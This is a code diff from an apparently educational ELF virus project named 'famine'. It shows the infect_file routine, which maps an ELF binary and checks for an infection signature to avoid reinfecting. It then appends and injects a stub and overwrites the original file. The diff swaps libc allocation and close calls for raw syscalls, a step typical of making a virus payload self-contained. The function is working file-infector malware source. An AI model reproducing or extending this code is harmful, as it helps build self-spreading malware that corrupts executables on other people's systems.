@@ -1,5 +1,17 @@
 #include "../include/famine.h"
 
+static void *mmalloc(size_t size) {
+	size_t ret = sys_mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (sys_ret_is_err(ret)) {
+		return NULL;
+	}
+	return (void*)ret;
+}
+
+static void ffree(void *ptr, size_t size) {
+	sys_munmap(ptr, size);
+}
+
 int infect_file(const char *path, const unsigned char *stub, size_t stub_len)
 {
 	t_famine	f;
@@ -14,7 +26,7 @@ int infect_file(const char *path, const unsigned char *stub, size_t stub_len)
 		return (LOG("fstat/size check failed\n"), sys_close(fd), 1);
 
 	map = (void*)sys_mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
-	close(fd);
+	sys_close(fd);
 	if (map == MAP_FAILED || sys_ret_is_err((size_t)map))
 		return (LOG("mmap failed\n"), 1);
 	if (!is_valid_elf((Elf64_Ehdr *)map, st.st_size) || my_memmem(map, st.st_size, FAMINE_SIG, sizeof(FAMINE_SIG) - 1))
@@ -22,7 +34,7 @@ int infect_file(const char *path, const unsigned char *stub, size_t stub_len)
 
 	f.stub_offset = (st.st_size + PAGE_SIZE - 1) & ~((size_t)PAGE_SIZE - 1);
 	f.out_size = f.stub_offset + stub_len;
-	f.out = malloc(f.out_size);
+	f.out = mmalloc(f.out_size);
 	if (!f.out)
 		return (sys_munmap(map, st.st_size), 1);
 	my_memset(f.out, 0, f.out_size);
@@ -32,16 +44,16 @@ int infect_file(const char *path, const unsigned char *stub, size_t stub_len)
 	f.ehdr = (Elf64_Ehdr *)f.out;
 	f.phdr = (Elf64_Phdr *)(f.out + f.ehdr->e_phoff);
 	if (find_segments(&f))
-		return (free(f.out), 1);
+		return (ffree(f.out, f.out_size), 1);
 
 	inject_stub(&f, stub, stub_len);
 
 	fd = sys_open(path, O_WRONLY | O_TRUNC, st.st_mode & 07777);
 	if (sys_ret_is_err(fd))
-		return (LOG("open(%s) for write failed\n", path), free(f.out), 1);
+		return (LOG("open(%s) for write failed\n", path), ffree(f.out, f.out_size), 1);
 	if (sys_write(fd, f.out, f.out_size) != f.out_size)
-		return (LOG("write failed\n"), sys_close(fd), free(f.out), 1);
+		return (LOG("write failed\n"), sys_close(fd), ffree(f.out, f.out_size), 1);
 	sys_close(fd);
-	free(f.out);
+	ffree(f.out, f.out_size);
 	return (0);
 }
